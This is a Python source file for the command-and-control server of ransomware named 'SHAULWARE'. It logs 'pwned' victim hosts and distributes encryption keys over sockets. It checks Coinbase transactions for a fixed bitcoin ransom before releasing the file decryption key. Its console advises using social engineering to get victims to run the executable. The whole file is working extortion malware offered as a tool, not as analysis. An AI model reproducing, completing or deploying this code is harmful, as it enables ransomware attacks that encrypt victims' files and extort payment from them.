from socket import *
import select
import rsa
import pickle
from cryptography.fernet import Fernet
import threading
from coinbase.wallet.client import Client
import os
import sys


SERVER_ADDRESS = ('', 17694)
client_list = []
information_list = []
hostname_sock = {}
socks_and_ips = []
with open("communication_encryption_key.txt", 'rb') as communication_key_file:
    SYMMETRIC_KEY = communication_key_file.read()
my_server_socket = socket(AF_INET, SOCK_STREAM)

my_server_socket.bind(SERVER_ADDRESS)
stop = False


class Listen(threading.Thread):
    global client_list
    global information_list
    global stop

    def __init__(self, server_socket, symmetric_key):
        threading.Thread.__init__(self)
        self.server_socket = server_socket
        self.symmetric = symmetric_key
        self.BUFFER_SIZE = 4096

    def run(self):
        global stop
        while not stop:
            self.server_socket.listen()
            client_sock, address = self.server_socket.accept()
            client_list.append(client_sock)
            received_data = pickle.loads(client_sock.recv(self.BUFFER_SIZE))
            client_public_key = received_data[0]
            information_list.append((received_data[1], address))
            socks_and_ips.append((client_sock, address[0]))
            hostname_sock[client_sock] = received_data[1]
            send_key = rsa.encrypt(self.symmetric, client_public_key)
            client_sock.send(pickle.dumps(send_key))


def check_payment(transaction_id):
    # you think i'm dumb enough to upload my api_secret and my account id? you tripping.
    api_key = ''
    api_secret = ''
    account_id = "*"
    my_address = "*"
    # ["to"]["address"]
    client = Client(api_key, api_secret)
    transaction = client.get_transaction(account_id, transaction_id)
    can_decrypt = transaction["amount"]["amount"] == "-0.00041194" and transaction["to"]["address"] == my_address
    return can_decrypt


class Communicate(threading.Thread):
    global information_list
    global client_list
    global stop

    def __init__(self, server_socket, symmetric_key):
        threading.Thread.__init__(self)
        self.server_socket = server_socket
        self.fernet = Fernet(symmetric_key)
        self.KEY_SIZE_IN_BYTES = 300
        self.BUFFER_SIZE = 4096

    def run(self):
        global stop
        while not stop:
            if client_list:
                rlist, wlist, xlist = select.select([self.server_socket] + client_list, client_list, [])
                for current_socket in wlist:
                    data = current_socket.recv(self.BUFFER_SIZE)
                    try:
                        data = self.fernet.decrypt(data)
                        data = data.decode()
                        if data == "sendkey":
                            with open("file_encryption_key.txt", 'rb') as key_file:
                                key = key_file.read()
                            data_tosend = self.fernet.encrypt(key)
                            current_socket.send(data_tosend)
                    except Exception as N:
                        if data:
                            try:
                                image_size = int(data.decode())
                                print(image_size)
                                image_data = b""
                                while len(image_data) < image_size:
                                    to_read = image_size - len(data)
                                    image_data += current_socket.recv(self.BUFFER_SIZE if to_read > 4096 else to_read)
                                print("finished getting the image")
                                with open(f'{hostname_sock[current_socket]}.png', 'wb') as good_deed:
                                    good_deed.write(image_data)
                                current_socket.send(pickle.dumps(True))  # wait for good deed to be accepted
                            except Exception as N:
                                current_socket.send(pickle.dumps(False))  # don't accept the send


class ControlPanel(threading.Thread):
    global information_list
    global client_list
    global stop

    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        global stop
        print("""
                    Hi, Welcome to SHAULWARE administrator interface!
                    for help enter help.
                    """)
        while not stop:
            print("ShaulWare#~", end='')
            user_input = input()
            user_input = user_input.split(" ")
            command = user_input[0]
            if command == "help":
                print("""Available commands are: 
                showlist - shows a list of ip addresses and hostnames of pwned computers
                help - shows help
                quit - quits the server
                clear - clears the terminal
                -----------------
                More commands coming soon !
                """)
            elif command == "showlist":
                if not information_list:
                    print("""
                    Hmm... No clients pwned yet..
                    Start using social engineering to get your victims to download the executable
                    """)
                else:
                    for hostname, address in information_list:
                        print(f"{hostname}     |      {address}")
            elif command == "quit":
                stop = True
                quit()
            elif command == "clear":
                for i in range(50):
                    print("\n")
            elif command == "approve":
                hostname = user_input[1]
                socket_to_send = [k for k, v in hostname_sock.items() if v == hostname][0]
                socket_to_send.send(pickle.dumps(True))
            elif command == "dissprove":
                hostname = user_input[1]
                socket_to_send = [k for k, v in hostname_sock.items() if v == hostname][0]
                socket_to_send.send(pickle.dumps(False))
            else:
                print(f"\nUnknown command: {command}. Try Again! \nFor list of command enter help.\n")


listen = Listen(server_socket=my_server_socket, symmetric_key=SYMMETRIC_KEY)
listen.start()

communicate = Communicate(server_socket=my_server_socket, symmetric_key=SYMMETRIC_KEY)
communicate.start()

control_panel = ControlPanel()
control_panel.start()
